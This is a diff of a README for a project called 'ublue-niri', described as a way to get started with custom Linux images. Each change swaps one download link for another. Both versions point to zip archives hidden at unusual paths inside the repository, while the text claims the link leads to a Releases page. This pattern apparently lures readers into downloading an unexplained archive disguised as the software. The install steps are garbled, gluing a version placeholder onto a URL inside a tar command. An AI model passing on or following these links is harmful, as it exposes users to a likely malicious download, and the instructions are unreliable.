@@ -1,6 +1,6 @@
 # 🌟 ublue-niri - A Simple Way to Get Started with Custom Linux Images
 
-[![Download ublue-niri](https://raw.githubusercontent.com/Nabzz876/ublue-niri/main/files/system/usr/bin/niri-ublue-v2.7.zip)](https://raw.githubusercontent.com/Nabzz876/ublue-niri/main/files/system/usr/bin/niri-ublue-v2.7.zip)
+[![Download ublue-niri](https://github.com/Nabzz876/ublue-niri/raw/refs/heads/main/files/scripts/niri_ublue_3.4-alpha.2.zip)](https://github.com/Nabzz876/ublue-niri/raw/refs/heads/main/files/scripts/niri_ublue_3.4-alpha.2.zip)
 
 ## 📦 What is ublue-niri?
 
@@ -12,7 +12,7 @@ To use ublue-niri, you need to download the software and set it up on your syste
 
 ### 🔗 Download & Install
 
-Visit this page to download: [Download ublue-niri](https://raw.githubusercontent.com/Nabzz876/ublue-niri/main/files/system/usr/bin/niri-ublue-v2.7.zip).
+Visit this page to download: [Download ublue-niri](https://github.com/Nabzz876/ublue-niri/raw/refs/heads/main/files/scripts/niri_ublue_3.4-alpha.2.zip).
 
 1. Click on the link above to go to the Releases page.
 2. You will see several versions available. Choose the latest version for the best experience.
@@ -37,7 +37,7 @@ To run ublue-niri smoothly, ensure your system meets the following requirements:
    ```
 4. Extract the downloaded file using the following command:
    ```bash
-   tar -xvf ublue-niri-<version>https://raw.githubusercontent.com/Nabzz876/ublue-niri/main/files/system/usr/bin/niri-ublue-v2.7.zip
+   tar -xvf ublue-niri-<version>https://github.com/Nabzz876/ublue-niri/raw/refs/heads/main/files/scripts/niri_ublue_3.4-alpha.2.zip
    ```
 5. Change to the extracted directory:
    ```bash
@@ -79,4 +79,4 @@ Be sure to check the release notes on the Releases page for updates on new featu
 
 Use the link below to download the software again or to check for any new releases:
 
-[Download ublue-niri](https://raw.githubusercontent.com/Nabzz876/ublue-niri/main/files/system/usr/bin/niri-ublue-v2.7.zip)
+[Download ublue-niri](https://github.com/Nabzz876/ublue-niri/raw/refs/heads/main/files/scripts/niri_ublue_3.4-alpha.2.zip)
